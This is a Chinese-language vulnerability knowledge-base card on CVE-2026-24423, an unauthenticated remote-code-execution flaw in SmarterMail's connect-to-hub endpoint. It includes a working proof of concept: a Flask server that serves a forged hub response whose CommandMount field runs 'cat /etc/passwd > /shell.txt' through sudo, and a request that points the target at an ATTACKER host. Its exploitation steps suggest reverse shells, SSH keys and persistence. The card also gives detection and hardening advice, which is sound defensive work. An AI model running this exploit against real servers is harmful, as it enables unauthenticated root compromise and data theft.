---
id: web-dotnet-smartermail-connect-to-hub-mount-command-rce
title: SmarterMail ConnectToHub 匿名接入恶意 Hub：响应中的 CommandMount 经 sudo 执行任意命令（CVE-2026-24423）
type: scenario
domain: web
path: web/dotnet
technique: smartermail-connecttohub-mount-command-rce
tags:
- dotnet
- smartermail
- rce
- unauthenticated
- ssrf
- command-injection
- mount
- cve-2026-24423
cve:
- CVE-2026-24423
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: < Build 9511（CVE 公告：SmarterMail prior to build 9511）
verification:
  verified_by: verifier-V36
  verified_at: '2026-11-05T05:59:36+08:00'
  notes: 已对照原文与11张图核对：CVE-2026-24423 记录（< Build 9511、CWE-306、CVSS 9.3）、AllowAnonymous、ConnectToHub→setup-initial-connection→Mount→CommandMount→bash -c sudo 链路与复现截图（/shell.txt 写入 passwd）均一致；未在本机复现。
url: /docs/web/dotnet/web-dotnet-smartermail-connect-to-hub-mount-command-rce/
draft: false
kb_aliases:
- CVE-2026-24423
- SmarterMail 未授权 RCE
- ConnectToHub 命令执行
- MountConfiguration.Mount
- CommandMount 注入
- CWE-306
---

## 一句话结论

SmarterMail Build 9511 之前的 `POST /api/v1/settings/sysadmin/connect-to-hub` 标注了 `[AuthenticatedService(AllowAnonymous = true)]`，任何人都能调用；它把请求体 `hubAddress` 拼成 `http(s)://<hubAddress>/web/api/node-management/setup-initial-connection` 并 POST，然后完全信任返回 JSON 中的 `SystemMount.MountPath` 与 `CommandMount`。当 `IsStandby=false` 时进入 `MountConfiguration.Mount(SystemMount, true)`，其中 `CommandMount` 非空即调用 `MountConfiguration.RunCommand` → `CommandLine.RunCommand`，最终以 `/bin/bash -c "sudo <CommandMount>"`（Windows 为 `cmd.exe /c`）执行，形成未授权的 root 命令执行。

## 原理

- 入口：`SystemAdminSettingsController.ConnectToHub([FromBody] ConnectToHubInput input)`，路由 `api/v1/settings/sysadmin` + `connect-to-hub`；特性 `[AuthenticatedService(AllowAnonymous = true)]` 使这个本该由系统管理员使用的接口对匿名开放（CWE-306）。
- 请求体 `ConnectToHubInput` 只有两个字段：`hubAddress`（Hub 的 URL 或 IP）与 `oneTimePassword`；两者完全由调用方控制。
- `SystemSettingsService.ConnectToHub()` 把 `hubAddress.TrimEnd('/') + "/web/api/node-management/setup-initial-connection"` 作为目标，向该地址 POST 一段包含 `hubAddress/oneTimePassword/nodeName` 的 JSON，并读取响应字符串。
- 响应被 `JsonConvert.DeserializeObject<InitialConnectionResult>` 解析为 `ClusterId`、`SharedSecret`、`TargetHubs`、`IsStandby`、`SystemMount` 等字段。服务端没有校验来源、没有签名/HMAC、没有确认对方是合法 Hub——攻击者自建 HTTP 服务即可伪造整个响应。
- 当 `IsStandby == false` 时执行 `MountConfiguration.Mount(decodedObject.SystemMount, true)`；`SystemMount` 里的 `MountPath` 与 `CommandMount` 都来自攻击者响应。
- `MountConfiguration.Mount`：先写测试文件、检查挂载状态与读写权限；随后若 `CommandMount` 非空且不等于 `"null"`，调用 `MountConfiguration.RunCommand(mount.MountPath, mount.CommandMount, mount.UseArgumentsInCommand)`。**这一步在“目录是否存在”检查之前执行**，所以即使 `MountPath` 不存在导致挂载最终失败，命令也已经执行。
- `RunCommand` 在 `UseArgumentsInCommand=false`（默认，攻击者不传即为 false）时直接调用 `CommandLine.RunCommand`；后者用 `ProcessStartInfo { FileName = /bin/bash, Arguments = "-c \"sudo <command>\"" }`（Linux）或 `cmd.exe /c`（Windows），`UseShellExecute=false`、重定向输出。`sudo` 让命令在 Linux 上升权到 root。
- 根因有两层：① 匿名可调用的管理接口执行了“连接外部 Hub 并采信其响应”的高危动作；② 采信的响应字段直接进入 `bash -c`/`cmd.exe /c`，响应内容等价于远程命令。
- 影响：未认证攻击者只需让目标访问自己的 HTTP 服务，即可在 SmarterMail 主机执行任意命令（文章验证写入 `/shell.txt` 的 `/etc/passwd` 内容，文件在根目录，说明具备 root/容器 root 权限）。

## 触发条件

- SmarterMail < Build 9511（CVE 公告明确 prior to build 9511）。
- 目标 Web 服务可访问（默认 80/443），`/api/v1/settings/sysadmin/connect-to-hub` 未被网关额外拦截。
- 攻击者能提供一个可被目标访问的 HTTP 服务，返回构造好的 `setup-initial-connection` JSON。
- 目标进程可执行 `bash`/`cmd.exe` 并具备 `sudo`（Linux 容器/主机默认），或至少具备运行挂载命令的权限。
- `SystemMount.CommandMount` 非空且不为 `"null"`；`UseArgumentsInCommand` 缺省 false 时命令原样交给 shell。

## 利用步骤

1. 在攻击者服务器上启动一个 HTTP 服务，对 `/web/api/node-management/setup-initial-connection` 返回伪造 JSON：`ClusterID`、`SharedSecret`、`TargetHubs`、`IsStandby=false`、`SystemMount.MountPath`、`SystemMount.CommandMount`（要执行的命令）。
2. 向目标发送 `POST /api/v1/settings/sysadmin/connect-to-hub`，body `{"hubAddress":"http://ATTACKER:8082","oneTimePassword":"test"}`。
3. 目标向攻击者发起 POST；攻击者返回恶意 JSON。
4. 目标解析响应，`IsStandby=false` → `MountConfiguration.Mount` → `CommandMount` 被执行（在目录存在性检查之前）。
5. 验证：命令写入的文件出现在目标可访问位置（文章用 `cat /etc/passwd > /shell.txt`，随后在根目录读取到 passwd）；也可用回连/延时确认。
6. 将命令替换为反弹 shell、写 SSH key、植入持久化；若目标在容器内且以 root 运行，即容器内 root。

## PoC

```python
# 攻击者侧：伪造 Hub 响应
from flask import Flask, Response
app = Flask(__name__)

@app.route("/web/api/node-management/setup-initial-connection", methods=["GET", "POST"])
def init_handler():
    return Response('''{
  "ClusterID":"f0e12780-f462-4b51-a7db-149f1d56209c",
  "SharedSecret":"vulncheck",
  "TargetHubs":{"a":"b"},
  "IsStandby":false,
  "SystemMount":{
    "MountPath":"/cat",
    "CommandMount":"cat /etc/passwd > /shell.txt"
  },
  "SystemAdminUsernames":["poptart"]
}''', mimetype="application/json")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8082)
```

```http
POST /api/v1/settings/sysadmin/connect-to-hub HTTP/1.1
Host: target
Content-Type: application/json

{"hubAddress":"http://ATTACKER:8082","oneTimePassword":"test"}
```

```text
服务端链路：
  ConnectToHub(input)
    → POST http://ATTACKER:8082/web/api/node-management/setup-initial-connection
    → 解析响应，IsStandby=false
    → MountConfiguration.Mount(SystemMount, true)
        → CommandMount 非空 → RunCommand(MountPath, CommandMount, false)
            → CommandLine.RunCommand → /bin/bash -c "sudo cat /etc/passwd > /shell.txt"

文章结果：根目录出现 /shell.txt，内容为 /etc/passwd（root 行可见），未授权 RCE 复现成功。
首次尝试返回 400 / "Failed to mount system mount..." 属正常（挂载检查失败），但命令已在检查前执行。
本卡未在本机复现。
```

## 变体与关联

- 变体（命令字段）：`CommandMount` 可替换为任意命令；`MountPath` 只要是一个可写/可存在路径即可，甚至不存在也不阻止命令执行（执行先于存在性检查）。
- 变体（参数模式）：`UseArgumentsInCommand=true` 时命令会拼接 `nodeName/primaryServer/path` 等参数，仍由攻击者控制命令主体；默认为 false，最直接。
- 变体（Windows）：`CommandLine.RunCommand` 在 Windows 使用 `cmd.exe /c`，可执行 PowerShell/CMD 命令，`sudo` 分支不适用。
- 变体（Hub 地址）：`hubAddress` 可指向任意可达地址，除 RCE 外还构成服务端请求（SSRF）面；也可指向内网服务探测。
- 关联：web/generic/ssrf 下同类“服务端请求攻击者地址并采信响应”的模式；本卡的关键是响应字段进入命令执行。
- 关联：cloud/container 容器逃逸卡；本卡若目标运行在容器且以 root 运行，命令即容器 root，进一步可结合挂载/特权逃逸。
- 边界：升级 Build 9511+、为 ConnectToHub 恢复认证/管理员权限、校验 Hub 响应签名后链路失效；目标无法访问攻击者 HTTP 服务时不可达；禁用/限制 `CommandMount` 可阻断。

## 检测与防御

- 请求检测：匿名请求 `POST /api/v1/settings/sysadmin/connect-to-hub`，`hubAddress` 指向外部/陌生地址；`oneTimePassword` 任意；随后目标对陌生地址发起 `setup-initial-connection` POST。
- 主机检测：SmarterMail 进程派生 `/bin/bash -c "sudo ..."` 或 `cmd.exe /c` 子进程；`MountConfiguration` 日志出现 `Run command path` / `Run command`；根目录/应用目录出现异常文件；`sudo` 审计日志出现 SmarterMail 服务账户执行任意命令。
- 修复：升级到 Build 9511 及以上（官方修复）；`ConnectToHub` 必须要求管理员认证，移除 `AllowAnonymous=true`。
- 修复：不要信任远程 Hub 响应中的 `CommandMount`/`MountPath`；挂载命令应使用固定白名单或由本地管理员配置，禁止远程下发 shell 命令；对 Hub 地址做允许列表与签名校验。
- 加固：SmarterMail 以非 root/最小权限运行，容器内禁用 sudo；出网限制，只允许访问已知 Hub；对 `connect-to-hub` 做网关级鉴权与速率限制；监控 `MountConfiguration` 与子进程。
- 审计：搜索 `[AuthenticatedService(AllowAnonymous = true)]` 标注的高危接口；检查所有把外部响应字段传入 `ProcessStartInfo`/`CommandLine.RunCommand` 的调用点；检查 `MountConfiguration.Mount` 的调用来源与参数。
